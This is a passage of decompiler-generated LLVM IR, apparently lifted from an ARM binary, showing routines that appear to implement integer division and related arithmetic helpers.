  %v6_14d70 = zext i8 %v4_14d70 to i32
  %v1_14d74 = add i32 %v1_14d70, 1
  %v2_14d78 = icmp eq i8 %v4_14d70, 0
  br i1 %v2_14d78, label %dec_label_pc_14d88, label %dec_label_pc_14d68

dec_label_pc_14d88:                               ; preds = %dec_label_pc_14d70, %dec_label_pc_14d58
  %v1_14d88 = phi i32 [ %v1_14d58, %dec_label_pc_14d58 ], [ %v1_14d74, %dec_label_pc_14d70 ]
  %v2_14d88 = sub i32 %v1_14d88, %v0_14d60
  ret i32 %v2_14d88

; uselistorder directives
  uselistorder i32 %v6_14d70, { 1, 0 }
  uselistorder i32 %v1_14d70, { 2, 1, 0 }
  uselistorder i32 %v0_14d48, { 0, 2, 1 }
  uselistorder i8 0, { 61, 18, 25, 26, 62, 17, 22, 63, 27, 28, 29, 30, 31, 50, 67, 65, 49, 66, 64, 48, 42, 8, 9, 68, 69, 73, 74, 24, 58, 59, 70, 71, 72, 15, 75, 43, 51, 77, 0, 76, 52, 44, 78, 79, 80, 81, 82, 83, 10, 55, 87, 1, 85, 84, 53, 2, 86, 54, 3, 88, 89, 32, 4, 91, 90, 56, 92, 93, 94, 95, 45, 46, 97, 98, 96, 11, 12, 13, 99, 5, 16, 100, 101, 102, 19, 60, 104, 105, 106, 107, 103, 47, 108, 109, 110, 111, 33, 34, 35, 36, 37, 112, 20, 38, 14, 23, 6, 7, 114, 113, 39, 115, 116, 40, 117, 57, 21, 118, 119, 120, 121, 124, 122, 123, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 144, 143, 41, 145, 146, 147 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 7, 3, 6 }
}

define i32 @function_14d90() local_unnamed_addr {
dec_label_pc_14d90:
  %v0_14d90 = load i32, i32* @r1, align 4
  %v1_14d90 = add i32 %v0_14d90, -1
  %v7_14d90 = icmp eq i32 %v0_14d90, 1
  br i1 %v7_14d90, label %bb, label %bb82

bb:                                               ; preds = %dec_label_pc_14d90
  %v2_14d94 = load i32, i32* @r0, align 4
  ret i32 %v2_14d94

bb82:                                             ; preds = %dec_label_pc_14d90
  %v2_14d90 = icmp eq i32 %v0_14d90, 0
  br i1 %v2_14d90, label %dec_label_pc_14e78, label %dec_label_pc_14d9c

dec_label_pc_14d9c:                               ; preds = %bb82
  %v0_14d9c = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_14d9c, %v0_14d90
  br i1 %tmp, label %dec_label_pc_14da4, label %dec_label_pc_14e30

dec_label_pc_14da4:                               ; preds = %dec_label_pc_14d9c
  %v2_14da4 = and i32 %v1_14d90, %v0_14d90
  %v4_14da4 = icmp eq i32 %v2_14da4, 0
  br i1 %v4_14da4, label %dec_label_pc_14e3c, label %dec_label_pc_14dac

dec_label_pc_14dac:                               ; preds = %dec_label_pc_14da4
  %v3_14dac = icmp ult i32 %v0_14d90, 536870912
  br i1 %v3_14dac, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_14dac
  %v4_14db0 = mul i32 %v0_14d90, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_14dac, %.thread
  %v0_14dd0.pr36.ph = phi i32 [ %v4_14db0, %.thread ], [ %v0_14d90, %dec_label_pc_14dac ]
  %storemerge137 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_14dac ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb85
  %v0_14dd0.pr36 = phi i32 [ %v4_14dc4, %bb85 ], [ %v0_14dd0.pr36.ph, %.preheader.preheader ]
  %v1_14dc8 = phi i32 [ %v4_14dc8, %bb85 ], [ %storemerge137, %.preheader.preheader ]
  %v2_14dbc = icmp ugt i32 %v0_14dd0.pr36, 268435455
  br i1 %v2_14dbc, label %.thread2, label %bb83

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_14dd0thread-pre-split.loopexit

bb83:                                             ; preds = %.preheader
  %v4_14dc0 = icmp ult i32 %v0_14dd0.pr36, %v0_14d9c
  br i1 %v4_14dc0, label %bb84, label %dec_label_pc_14dd0thread-pre-split.loopexit.loopexit

bb84:                                             ; preds = %bb83
  %v2_14dc4 = and i32 %v0_14dd0.pr36, 268435456
  %v3_14dc4 = icmp eq i32 %v2_14dc4, 0
  %v4_14dc4 = mul i32 %v0_14dd0.pr36, 16
  br i1 %v3_14dc4, label %bb85, label %dec_label_pc_14dd0.loopexit

bb85:                                             ; preds = %bb84
  %v2_14dc8 = and i32 %v1_14dc8, 268435456
  %v3_14dc8 = icmp eq i32 %v2_14dc8, 0
  %v4_14dc8 = mul i32 %v1_14dc8, 16
  br i1 %v3_14dc8, label %.preheader, label %dec_label_pc_14dd0thread-pre-split.loopexit.loopexit

dec_label_pc_14dd0thread-pre-split.loopexit.loopexit: ; preds = %bb85, %bb83
  %v1_14ddc48.ph = phi i32 [ %v1_14dc8, %bb83 ], [ %v4_14dc8, %bb85 ]
  %v0_14dd0.pr38.ph = phi i32 [ %v0_14dd0.pr36, %bb83 ], [ %v4_14dc4, %bb85 ]
  br label %dec_label_pc_14dd0thread-pre-split.loopexit

dec_label_pc_14dd0thread-pre-split.loopexit:      ; preds = %dec_label_pc_14dd0thread-pre-split.loopexit.loopexit, %.thread2
  %v1_14ddc48 = phi i32 [ %v1_14dc8, %.thread2 ], [ %v1_14ddc48.ph, %dec_label_pc_14dd0thread-pre-split.loopexit.loopexit ]
  %v0_14dd0.pr38 = phi i32 [ %v0_14dd0.pr36, %.thread2 ], [ %v0_14dd0.pr38.ph, %dec_label_pc_14dd0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14dd0thread-pre-split

dec_label_pc_14dd0thread-pre-split:               ; preds = %dec_label_pc_14dd0thread-pre-split.loopexit, %bb87
  %v1_14ddc46 = phi i32 [ %v1_14ddc48, %dec_label_pc_14dd0thread-pre-split.loopexit ], [ %v3_14ddc, %bb87 ]
  %v0_14dd0.pr = phi i32 [ %v0_14dd0.pr38, %dec_label_pc_14dd0thread-pre-split.loopexit ], [ %v3_14dd8, %bb87 ]
  br label %dec_label_pc_14dd0

dec_label_pc_14dd0.loopexit:                      ; preds = %bb84
  br label %dec_label_pc_14dd0

dec_label_pc_14dd0:                               ; preds = %dec_label_pc_14dd0.loopexit, %dec_label_pc_14dd0thread-pre-split
  %v1_14ddc = phi i32 [ %v1_14ddc46, %dec_label_pc_14dd0thread-pre-split ], [ %v1_14dc8, %dec_label_pc_14dd0.loopexit ]
  %v1_14dd8 = phi i32 [ %v0_14dd0.pr, %dec_label_pc_14dd0thread-pre-split ], [ %v4_14dc4, %dec_label_pc_14dd0.loopexit ]
  %v2_14dd0 = icmp slt i32 %v1_14dd8, 0
  br i1 %v2_14dd0, label %dec_label_pc_14de4, label %bb86

bb86:                                             ; preds = %dec_label_pc_14dd0
  %v4_14dd4 = icmp ult i32 %v1_14dd8, %v0_14d9c
  br i1 %v4_14dd4, label %bb87, label %dec_label_pc_14de4

bb87:                                             ; preds = %bb86
  %v3_14dd8 = mul i32 %v1_14dd8, 2
  %v2_14ddc = icmp slt i32 %v1_14ddc, 0
  %v3_14ddc = mul i32 %v1_14ddc, 2
  br i1 %v2_14ddc, label %dec_label_pc_14de4, label %dec_label_pc_14dd0thread-pre-split

dec_label_pc_14de4:                               ; preds = %bb86, %dec_label_pc_14dd0, %bb87
  %v2_14df059 = phi i32 [ %v3_14ddc, %bb87 ], [ %v1_14ddc, %bb86 ], [ %v1_14ddc, %dec_label_pc_14dd0 ]
  %v1_14de851 = phi i32 [ %v3_14dd8, %bb87 ], [ %v1_14dd8, %bb86 ], [ %v1_14dd8, %dec_label_pc_14dd0 ]
  br label %dec_label_pc_14de8

dec_label_pc_14de8:                               ; preds = %.thread11, %dec_label_pc_14de4
  %v1_14e1c = phi i32 [ %v4_14e1c, %.thread11 ], [ %v2_14df059, %dec_label_pc_14de4 ]
  %v1_14df0 = phi i32 [ %v0_14e28, %.thread11 ], [ 0, %dec_label_pc_14de4 ]
  %v1_14e20 = phi i32 [ %v4_14e20, %.thread11 ], [ %v1_14de851, %dec_label_pc_14de4 ]
  %v1_14dec = phi i32 [ %v0_14e18, %.thread11 ], [ %v0_14d9c, %dec_label_pc_14de4 ]
  %v3_14de8 = icmp ult i32 %v1_14dec, %v1_14e20
  br i1 %v3_14de8, label %.thread7, label %bb88

bb88:                                             ; preds = %dec_label_pc_14de8
  %v3_14dec = sub i32 %v1_14dec, %v1_14e20
  %v3_14df0 = or i32 %v1_14df0, %v1_14e1c
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_14de8, %bb88
  %v1_14df8 = phi i32 [ %v1_14dec, %dec_label_pc_14de8 ], [ %v3_14dec, %bb88 ]
  %v1_14dfc = phi i32 [ %v1_14df0, %dec_label_pc_14de8 ], [ %v3_14df0, %bb88 ]
  %v4_14df4 = udiv i32 %v1_14e20, 2
  %v6_14df4 = icmp ult i32 %v1_14df8, %v4_14df4
  br i1 %v6_14df4, label %.thread8, label %bb89

bb89:                                             ; preds = %.thread7
  %v3_14df8 = urem i32 %v1_14e20, 2
  %v4_14df8 = icmp eq i32 %v3_14df8, 0
  %v6_14df8 = sub i32 %v1_14df8, %v4_14df4
  br i1 %v4_14df8, label %.thread8, label %bb90

bb90:                                             ; preds = %bb89
  %v5_14dfc = udiv i32 %v1_14e1c, 2
  %v6_14dfc = or i32 %v1_14dfc, %v5_14dfc
  br label %.thread8

.thread8:                                         ; preds = %bb89, %.thread7, %bb90
  %v1_14e04 = phi i32 [ %v6_14df8, %bb89 ], [ %v1_14df8, %.thread7 ], [ %v6_14df8, %bb90 ]
  %v1_14e08 = phi i32 [ %v1_14dfc, %bb89 ], [ %v1_14dfc, %.thread7 ], [ %v6_14dfc, %bb90 ]
  %v4_14e00 = udiv i32 %v1_14e20, 4
  %v6_14e00 = icmp ult i32 %v1_14e04, %v4_14e00
  br i1 %v6_14e00, label %.thread9, label %bb91

bb91:                                             ; preds = %.thread8
  %v3_14e04 = and i32 %v1_14e20, 2
  %v4_14e04 = icmp eq i32 %v3_14e04, 0
  %v6_14e04 = sub i32 %v1_14e04, %v4_14e00
  br i1 %v4_14e04, label %.thread9, label %bb92

bb92:                                             ; preds = %bb91
  %v5_14e08 = udiv i32 %v1_14e1c, 4
  %v6_14e08 = or i32 %v1_14e08, %v5_14e08
  br label %.thread9

.thread9:                                         ; preds = %bb91, %.thread8, %bb92
  %v1_14e10 = phi i32 [ %v6_14e04, %bb91 ], [ %v1_14e04, %.thread8 ], [ %v6_14e04, %bb92 ]
  %v1_14e14 = phi i32 [ %v1_14e08, %bb91 ], [ %v1_14e08, %.thread8 ], [ %v6_14e08, %bb92 ]
  %v4_14e0c = udiv i32 %v1_14e20, 8
  %v6_14e0c = icmp ult i32 %v1_14e10, %v4_14e0c
  br i1 %v6_14e0c, label %thread-pre-split, label %bb93

bb93:                                             ; preds = %.thread9
  %v3_14e10 = and i32 %v1_14e20, 4
  %v4_14e10 = icmp eq i32 %v3_14e10, 0
  %v6_14e10 = sub i32 %v1_14e10, %v4_14e0c
  br i1 %v4_14e10, label %thread-pre-split, label %bb94

bb94:                                             ; preds = %bb93
  %v5_14e14 = udiv i32 %v1_14e1c, 8
  %v6_14e14 = or i32 %v1_14e14, %v5_14e14
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb94, %.thread9, %bb93
  %v0_14e28 = phi i32 [ %v1_14e14, %bb93 ], [ %v1_14e14, %.thread9 ], [ %v6_14e14, %bb94 ]
  %v0_14e18 = phi i32 [ %v6_14e10, %bb93 ], [ %v1_14e10, %.thread9 ], [ %v6_14e10, %bb94 ]
  %v2_14e18 = icmp eq i32 %v0_14e18, 0
  br i1 %v2_14e18, label %dec_label_pc_14e28, label %bb95

bb95:                                             ; preds = %thread-pre-split
  %tmp142 = icmp ult i32 %v1_14e1c, 16
  br i1 %tmp142, label %dec_label_pc_14e28, label %.thread11

.thread11:                                        ; preds = %bb95
  %v4_14e1c = udiv i32 %v1_14e1c, 16
  %v4_14e20 = udiv i32 %v1_14e20, 16
  br label %dec_label_pc_14de8

dec_label_pc_14e28:                               ; preds = %thread-pre-split, %bb95
  ret i32 %v0_14e28

dec_label_pc_14e30:                               ; preds = %dec_label_pc_14d9c
  %v9_14d9c = icmp eq i32 %v0_14d9c, %v0_14d90
  %. = zext i1 %v9_14d9c to i32
  ret i32 %.

dec_label_pc_14e3c:                               ; preds = %dec_label_pc_14da4
  %v2_14e3c = icmp ugt i32 %v0_14d90, 65535
  br i1 %v2_14e3c, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_14e3c
  %v2_14e40 = and i32 %v0_14d90, 32768
  %v3_14e40 = icmp eq i32 %v2_14e40, 0
  %v4_14e40 = udiv i32 %v0_14d90, 65536
  br i1 %v3_14e40, label %.thread16, label %bb100

.thread16:                                        ; preds = %bb99, %dec_label_pc_14e3c
  %v0_14e4c65 = phi i32 [ %v0_14d90, %dec_label_pc_14e3c ], [ %v4_14e40, %bb99 ]
  br label %bb100

bb100:                                            ; preds = %bb99, %.thread16
  %v1_14e50 = phi i32 [ %v0_14e4c65, %.thread16 ], [ %v4_14e40, %bb99 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb99 ]
  %v2_14e4c = icmp ugt i32 %v1_14e50, 255
  br i1 %v2_14e4c, label %bb101, label %.thread17

bb101:                                            ; preds = %bb100
  %v2_14e50 = and i32 %v1_14e50, 128
  %v3_14e50 = icmp eq i32 %v2_14e50, 0
  %v4_14e50 = udiv i32 %v1_14e50, 256
  br i1 %v3_14e50, label %.thread17, label %bb102

bb102:                                            ; preds = %bb101
  %v2_14e54 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb101, %bb100, %bb102
  %v1_14e60 = phi i32 [ %storemerge, %bb100 ], [ %storemerge, %bb101 ], [ %v2_14e54, %bb102 ]
  %v1_14e5c = phi i32 [ %v1_14e50, %bb100 ], [ %v4_14e50, %bb101 ], [ %v4_14e50, %bb102 ]
  %v2_14e58 = icmp ugt i32 %v1_14e5c, 15
  br i1 %v2_14e58, label %bb103, label %.thread18

bb103:                                            ; preds = %.thread17
  %v2_14e5c = and i32 %v1_14e5c, 8
  %v3_14e5c = icmp eq i32 %v2_14e5c, 0
  %v4_14e5c = udiv i32 %v1_14e5c, 16
  br i1 %v3_14e5c, label %.thread18, label %bb104

bb104:                                            ; preds = %bb103
  %v2_14e60 = add nsw i32 %v1_14e60, 4
  br label %.thread18

.thread18:                                        ; preds = %bb103, %.thread17, %bb104
  %v4_14e68 = phi i32 [ %v1_14e60, %.thread17 ], [ %v1_14e60, %bb103 ], [ %v2_14e60, %bb104 ]
  %v5_14e6c = phi i32 [ %v1_14e5c, %.thread17 ], [ %v4_14e5c, %bb103 ], [ %v4_14e5c, %bb104 ]
  %v2_14e64 = icmp ugt i32 %v5_14e6c, 3
  %v7_14e64 = icmp eq i32 %v5_14e6c, 4
  %v2_14e68 = xor i1 %v7_14e64, true
  %v3_14e68 = and i1 %v2_14e64, %v2_14e68
  br i1 %v3_14e68, label %bb105, label %bb106

bb105:                                            ; preds = %.thread18
  %v5_14e68 = add nsw i32 %v4_14e68, 3
  br label %bb106

bb106:                                            ; preds = %.thread18, %bb105
  %v4_14e6c = phi i32 [ %v4_14e68, %.thread18 ], [ %v5_14e68, %bb105 ]
  %v2_14e6c = xor i1 %v2_14e64, true
  %v3_14e6c = or i1 %v7_14e64, %v2_14e6c
  br i1 %v3_14e6c, label %bb107, label %bb108

bb107:                                            ; preds = %bb106
  %v8_14e6c = udiv i32 %v5_14e6c, 2
  %v9_14e6c = add i32 %v4_14e6c, %v8_14e6c
  br label %bb108

bb108:                                            ; preds = %bb106, %bb107
  %v1_14e70 = phi i32 [ %v4_14e6c, %bb106 ], [ %v9_14e6c, %bb107 ]
  %v6_14e70 = lshr i32 %v0_14d9c, %v1_14e70
  ret i32 %v6_14e70

dec_label_pc_14e78:                               ; preds = %bb82
  %v0_14e78 = load i32, i32* @lr, align 4
  %v0_14e7c = call i32 @function_cbe0()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_14e78)
  %v9_14e88 = load i32, i32* @lr, align 4
  %v0_14e8c = call i32 @function_14d90()
  store i32 %v9_14e88, i32* @lr, align 4
  ret i32 %v0_14e8c

; uselistorder directives
  uselistorder i32 %v4_14e6c, { 1, 0 }
  uselistorder i1 %v7_14e64, { 1, 0 }
  uselistorder i32 %v4_14e5c, { 1, 0 }
  uselistorder i32 %v1_14e5c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14e50, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_14e50, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14e40, { 1, 0 }
  uselistorder i32 %v0_14e18, { 1, 0 }
  uselistorder i32 %v4_14e0c, { 1, 0 }
  uselistorder i32 %v1_14e14, { 1, 2, 0 }
  uselistorder i32 %v4_14e00, { 1, 0 }
  uselistorder i32 %v1_14e08, { 1, 2, 0 }
  uselistorder i32 %v4_14df4, { 1, 0 }
  uselistorder i32 %v1_14dfc, { 1, 2, 0 }
  uselistorder i32 %v1_14e20, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_14df0, { 1, 0 }
  uselistorder i32 %v1_14e1c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_14ddc, { 1, 0 }
  uselistorder i32 %v3_14dd8, { 1, 0 }
  uselistorder i32 %v1_14dd8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_14ddc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14dc8, { 1, 0 }
  uselistorder i32 %v4_14dc4, { 2, 1, 0 }
  uselistorder i32 %v1_14dc8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14dd0.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_14d9c, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_14d90, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1, 10, 12, 11 }
  uselistorder i32 ()* @function_14d90, { 12, 10, 9, 8, 7, 6, 5, 4, 3, 2, 11, 1, 0 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %dec_label_pc_14e28, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_14de4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14dd0thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_14ea0() local_unnamed_addr {
dec_label_pc_14ea0:
  %v0_14ea0 = load i32, i32* @r1, align 4
  %v1_14ea0 = icmp slt i32 %v0_14ea0, 0
  %v2_14ea0 = icmp eq i32 %v0_14ea0, 0
  %v0_14ea4 = load i32, i32* @r0, align 4
  %v2_14ea4 = xor i32 %v0_14ea4, %v0_14ea0
  br i1 %v2_14ea0, label %dec_label_pc_14fb8, label %dec_label_pc_14eac

dec_label_pc_14eac:                               ; preds = %dec_label_pc_14ea0
  br i1 %v1_14ea0, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_14eac
  %v2_14eac = sub i32 0, %v0_14ea0
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_14eac, %bb
  %v1_14f78 = phi i32 [ %v2_14eac, %bb ], [ %v0_14ea0, %dec_label_pc_14eac ]
  %v1_14eb0 = add i32 %v1_14f78, -1
  %v7_14eb0 = icmp eq i32 %v1_14f78, 1
  br i1 %v7_14eb0, label %dec_label_pc_14f58, label %dec_label_pc_14eb8

dec_label_pc_14eb8:                               ; preds = %thread-pre-split
  %v1_14eb8 = icmp slt i32 %v0_14ea4, 0
  br i1 %v1_14eb8, label %bb86, label %bb87

bb86:                                             ; preds = %dec_label_pc_14eb8
  %v2_14ebc = sub i32 0, %v0_14ea4
  br label %bb87

bb87:                                             ; preds = %dec_label_pc_14eb8, %bb86
  %v0_14fac = phi i32 [ %v0_14ea4, %dec_label_pc_14eb8 ], [ %v2_14ebc, %bb86 ]
  %v3_14ec0 = icmp uge i32 %v0_14fac, %v1_14f78
  %v9_14ec0 = icmp eq i32 %v0_14fac, %v1_14f78
  %v2_14ec4 = xor i1 %v3_14ec0, true
  %v3_14ec4 = or i1 %v9_14ec0, %v2_14ec4
  br i1 %v3_14ec4, label %dec_label_pc_14f64, label %dec_label_pc_14ec8

dec_label_pc_14ec8:                               ; preds = %bb87
  %v2_14ec8 = and i32 %v1_14eb0, %v1_14f78
  %v4_14ec8 = icmp eq i32 %v2_14ec8, 0
  br i1 %v4_14ec8, label %dec_label_pc_14f74, label %dec_label_pc_14ed0

dec_label_pc_14ed0:                               ; preds = %dec_label_pc_14ec8
  %v3_14ed0 = icmp ult i32 %v1_14f78, 536870912
  br i1 %v3_14ed0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_14ed0
  %v4_14ed4 = mul i32 %v1_14f78, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_14ed0, %.thread
  %v0_14ef4.pr40.ph = phi i32 [ %v4_14ed4, %.thread ], [ %v1_14f78, %dec_label_pc_14ed0 ]
  %storemerge144 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_14ed0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb90
  %v0_14ef4.pr40 = phi i32 [ %v4_14ee8, %bb90 ], [ %v0_14ef4.pr40.ph, %.preheader.preheader ]
  %v1_14eec = phi i32 [ %v4_14eec, %bb90 ], [ %storemerge144, %.preheader.preheader ]
  %v2_14ee0 = icmp ugt i32 %v0_14ef4.pr40, 268435455
  br i1 %v2_14ee0, label %.thread3, label %bb88

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_14ef4thread-pre-split.loopexit

bb88:                                             ; preds = %.preheader
  %v4_14ee4 = icmp ult i32 %v0_14ef4.pr40, %v0_14fac
  br i1 %v4_14ee4, label %bb89, label %dec_label_pc_14ef4thread-pre-split.loopexit.loopexit

bb89:                                             ; preds = %bb88
  %v2_14ee8 = and i32 %v0_14ef4.pr40, 268435456
  %v3_14ee8 = icmp eq i32 %v2_14ee8, 0
  %v4_14ee8 = mul i32 %v0_14ef4.pr40, 16
  br i1 %v3_14ee8, label %bb90, label %dec_label_pc_14ef4.loopexit

bb90:                                             ; preds = %bb89
  %v2_14eec = and i32 %v1_14eec, 268435456
  %v3_14eec = icmp eq i32 %v2_14eec, 0
  %v4_14eec = mul i32 %v1_14eec, 16
  br i1 %v3_14eec, label %.preheader, label %dec_label_pc_14ef4thread-pre-split.loopexit.loopexit

dec_label_pc_14ef4thread-pre-split.loopexit.loopexit: ; preds = %bb90, %bb88
  %v1_14f0052.ph = phi i32 [ %v1_14eec, %bb88 ], [ %v4_14eec, %bb90 ]
  %v0_14ef4.pr42.ph = phi i32 [ %v0_14ef4.pr40, %bb88 ], [ %v4_14ee8, %bb90 ]
  br label %dec_label_pc_14ef4thread-pre-split.loopexit

dec_label_pc_14ef4thread-pre-split.loopexit:      ; preds = %dec_label_pc_14ef4thread-pre-split.loopexit.loopexit, %.thread3
  %v1_14f0052 = phi i32 [ %v1_14eec, %.thread3 ], [ %v1_14f0052.ph, %dec_label_pc_14ef4thread-pre-split.loopexit.loopexit ]
  %v0_14ef4.pr42 = phi i32 [ %v0_14ef4.pr40, %.thread3 ], [ %v0_14ef4.pr42.ph, %dec_label_pc_14ef4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14ef4thread-pre-split

dec_label_pc_14ef4thread-pre-split:               ; preds = %dec_label_pc_14ef4thread-pre-split.loopexit, %bb92
  %v1_14f0050 = phi i32 [ %v1_14f0052, %dec_label_pc_14ef4thread-pre-split.loopexit ], [ %v3_14f00, %bb92 ]
  %v2_14ef848 = phi i32 [ %v0_14fac, %dec_label_pc_14ef4thread-pre-split.loopexit ], [ %v2_14ef8, %bb92 ]
  %v0_14ef4.pr = phi i32 [ %v0_14ef4.pr42, %dec_label_pc_14ef4thread-pre-split.loopexit ], [ %v3_14efc, %bb92 ]
  br label %dec_label_pc_14ef4

dec_label_pc_14ef4.loopexit:                      ; preds = %bb89
  br label %dec_label_pc_14ef4

dec_label_pc_14ef4:                               ; preds = %dec_label_pc_14ef4.loopexit, %dec_label_pc_14ef4thread-pre-split
  %v1_14f00 = phi i32 [ %v1_14f0050, %dec_label_pc_14ef4thread-pre-split ], [ %v1_14eec, %dec_label_pc_14ef4.loopexit ]
  %v2_14ef8 = phi i32 [ %v2_14ef848, %dec_label_pc_14ef4thread-pre-split ], [ %v0_14fac, %dec_label_pc_14ef4.loopexit ]
  %v1_14efc = phi i32 [ %v0_14ef4.pr, %dec_label_pc_14ef4thread-pre-split ], [ %v4_14ee8, %dec_label_pc_14ef4.loopexit ]
  %v2_14ef4 = icmp slt i32 %v1_14efc, 0
  br i1 %v2_14ef4, label %dec_label_pc_14f08, label %bb91

bb91:                                             ; preds = %dec_label_pc_14ef4
  %v4_14ef8 = icmp ult i32 %v1_14efc, %v2_14ef8
  br i1 %v4_14ef8, label %bb92, label %dec_label_pc_14f08

bb92:                                             ; preds = %bb91
  %v3_14efc = mul i32 %v1_14efc, 2
  %v2_14f00 = icmp slt i32 %v1_14f00, 0
  %v3_14f00 = mul i32 %v1_14f00, 2
  br i1 %v2_14f00, label %dec_label_pc_14f08, label %dec_label_pc_14ef4thread-pre-split

dec_label_pc_14f08:                               ; preds = %bb91, %dec_label_pc_14ef4, %bb92
  %v2_14f1463 = phi i32 [ %v3_14f00, %bb92 ], [ %v1_14f00, %bb91 ], [ %v1_14f00, %dec_label_pc_14ef4 ]
  %v1_14f0c55 = phi i32 [ %v3_14efc, %bb92 ], [ %v1_14efc, %bb91 ], [ %v1_14efc, %dec_label_pc_14ef4 ]
  br label %dec_label_pc_14f0c

dec_label_pc_14f0c:                               ; preds = %.thread13, %dec_label_pc_14f08
  %v1_14f40 = phi i32 [ %v4_14f40, %.thread13 ], [ %v2_14f1463, %dec_label_pc_14f08 ]
  %v1_14f14 = phi i32 [ %v1_14f50, %.thread13 ], [ 0, %dec_label_pc_14f08 ]
  %v1_14f44 = phi i32 [ %v4_14f44, %.thread13 ], [ %v1_14f0c55, %dec_label_pc_14f08 ]
  %v1_14f10 = phi i32 [ %v0_14f3c, %.thread13 ], [ %v0_14fac, %dec_label_pc_14f08 ]
  %v3_14f0c = icmp ult i32 %v1_14f10, %v1_14f44
  br i1 %v3_14f0c, label %.thread8, label %bb93

bb93:                                             ; preds = %dec_label_pc_14f0c
  %v3_14f10 = sub i32 %v1_14f10, %v1_14f44
  %v3_14f14 = or i32 %v1_14f14, %v1_14f40
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14f0c, %bb93
  %v1_14f1c = phi i32 [ %v1_14f10, %dec_label_pc_14f0c ], [ %v3_14f10, %bb93 ]
  %v1_14f20 = phi i32 [ %v1_14f14, %dec_label_pc_14f0c ], [ %v3_14f14, %bb93 ]
  %v4_14f18 = udiv i32 %v1_14f44, 2
  %v6_14f18 = icmp ult i32 %v1_14f1c, %v4_14f18
  br i1 %v6_14f18, label %.thread9, label %bb94

bb94:                                             ; preds = %.thread8
  %v3_14f1c = urem i32 %v1_14f44, 2
  %v4_14f1c = icmp eq i32 %v3_14f1c, 0
  %v6_14f1c = sub i32 %v1_14f1c, %v4_14f18
  br i1 %v4_14f1c, label %.thread9, label %bb95

bb95:                                             ; preds = %bb94
  %v5_14f20 = udiv i32 %v1_14f40, 2
  %v6_14f20 = or i32 %v1_14f20, %v5_14f20
  br label %.thread9

.thread9:                                         ; preds = %bb94, %.thread8, %bb95
  %v1_14f28 = phi i32 [ %v6_14f1c, %bb94 ], [ %v1_14f1c, %.thread8 ], [ %v6_14f1c, %bb95 ]
  %v1_14f2c = phi i32 [ %v1_14f20, %bb94 ], [ %v1_14f20, %.thread8 ], [ %v6_14f20, %bb95 ]
  %v4_14f24 = udiv i32 %v1_14f44, 4
  %v6_14f24 = icmp ult i32 %v1_14f28, %v4_14f24
  br i1 %v6_14f24, label %.thread10, label %bb96

bb96:                                             ; preds = %.thread9
  %v3_14f28 = and i32 %v1_14f44, 2
  %v4_14f28 = icmp eq i32 %v3_14f28, 0
  %v6_14f28 = sub i32 %v1_14f28, %v4_14f24
  br i1 %v4_14f28, label %.thread10, label %bb97

bb97:                                             ; preds = %bb96
  %v5_14f2c = udiv i32 %v1_14f40, 4
  %v6_14f2c = or i32 %v1_14f2c, %v5_14f2c
  br label %.thread10

.thread10:                                        ; preds = %bb96, %.thread9, %bb97
  %v1_14f34 = phi i32 [ %v6_14f28, %bb96 ], [ %v1_14f28, %.thread9 ], [ %v6_14f28, %bb97 ]
  %v1_14f38 = phi i32 [ %v1_14f2c, %bb96 ], [ %v1_14f2c, %.thread9 ], [ %v6_14f2c, %bb97 ]
  %v4_14f30 = udiv i32 %v1_14f44, 8
  %v6_14f30 = icmp ult i32 %v1_14f34, %v4_14f30
  br i1 %v6_14f30, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %.thread10
  %v3_14f34 = and i32 %v1_14f44, 4
  %v4_14f34 = icmp eq i32 %v3_14f34, 0
  %v6_14f34 = sub i32 %v1_14f34, %v4_14f30
